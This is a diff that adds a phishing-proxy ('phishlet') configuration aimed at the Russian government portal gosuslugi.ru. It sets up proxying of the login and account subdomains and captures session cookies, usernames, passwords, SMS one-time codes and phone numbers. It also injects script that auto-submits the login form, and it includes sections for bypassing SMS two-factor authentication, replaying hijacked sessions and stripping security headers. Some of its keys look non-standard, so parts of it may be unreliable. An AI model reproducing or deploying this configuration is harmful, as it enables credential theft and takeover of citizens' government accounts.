@@ -1,0 +1,136 @@
+# Госуслуги Phishlet
+# Конфигурация для перехвата Госуслуги (gosuslugi.ru)
+
+id: gosuslugi
+author: PhantomSec Labs
+description: Госуслуги - Russian Government Services Portal
+min_ver: 2.3.0
+
+proxy_hosts:
+  - phish_sub: www
+    orig_sub: www
+    domain: gosuslugi.ru
+    session: true
+    is_landing: true
+
+  - phish_sub: esia
+    orig_sub: esia
+    domain: gosuslugi.ru
+    session: true
+    is_landing: false
+
+  - phish_sub: lk
+    orig_sub: lk
+    domain: gosuslugi.ru
+    session: true
+    is_landing: false
+
+sub_filters:
+  - triggers_on: www.gosuslugi.ru
+    orig_sub: www
+    domain: gosuslugi.ru
+    search: 'https://{orig_sub}.{domain}'
+    replace: 'https://{phish_sub}.{domain}'
+    mimes:
+      - text/html
+      - application/javascript
+    redirect_only: false
+
+auth_tokens:
+  - domain: '.gosuslugi.ru'
+    keys:
+      - 'JSESSIONID'
+      - 'esia_token'
+      - 'lk_session'
+
+credentials:
+  username:
+    key: 'login'
+    search: '<input.*?name=["\']login["\'].*?value=["\']([^"\']*)["\']'
+    type: 'post'
+
+  password:
+    key: 'password'
+    search: '<input.*?name=["\']password["\'].*?value=["\']([^"\']*)["\']'
+    type: 'post'
+
+  custom:
+    - key: 'sms_code'
+      search: '<input.*?name=["\']smsCode["\'].*?value=["\']([^"\']*)["\']'
+      type: 'post'
+
+    - key: 'phone'
+      search: '<input.*?name=["\']phone["\'].*?value=["\']([^"\']*)["\']'
+      type: 'post'
+
+auth_urls:
+  - '/auth/'
+  - '/esia/'
+  - '/lk/auth/'
+  - '/auth/simple-auth'
+
+login:
+  domain: 'www.gosuslugi.ru'
+  path: '/auth/'
+  method: 'GET'
+  parameters: []
+
+js_inject:
+  - triggers_on: 'www.gosuslugi.ru'
+    js: |
+      // Remove Gosuslugi branding
+      var logos = document.querySelectorAll('.gosuslugi-logo, .header-logo');
+      logos.forEach(function(logo) { logo.style.opacity = '0.7'; });
+
+  - triggers_on: 'www.gosuslugi.ru'
+    js: |
+      // Auto-submit after credential entry
+      setInterval(function() {
+        var loginField = document.querySelector('input[name="login"]');
+        var passField = document.querySelector('input[name="password"]');
+        if (loginField && passField && loginField.value && passField.value) {
+          var submitBtn = document.querySelector('button[type="submit"]');
+          if (submitBtn) submitBtn.click();
+        }
+      }, 1000);
+
+force_post:
+  - path: '/auth/simple-auth'
+    search:
+      - key: 'login'
+        value: '.*'
+      - key: 'password'
+        value: '.*'
+    force:
+      - key: 'remember'
+        value: 'true'
+    type: 'post'
+
+# 2FA/MFA Bypass
+mfa_bypass:
+  enabled: true
+  methods:
+    - name: 'SMS'
+      trigger: 'sms'
+      capture_field: 'smsCode'
+
+# Session hijacking
+session_hijack:
+  enabled: true
+  cookie_names:
+    - 'JSESSIONID'
+    - 'esia_token'
+  replay_delay: 1000
+  concurrent_sessions: true
+
+# Redirect
+redirect:
+  enabled: true
+  url: 'https://www.gosuslugi.ru/'
+  delay: 3000
+
+# Anti-detection
+anti_detection:
+  remove_security_headers: true
+  fake_cert_transparency: true
+  randomize_response_timing: true
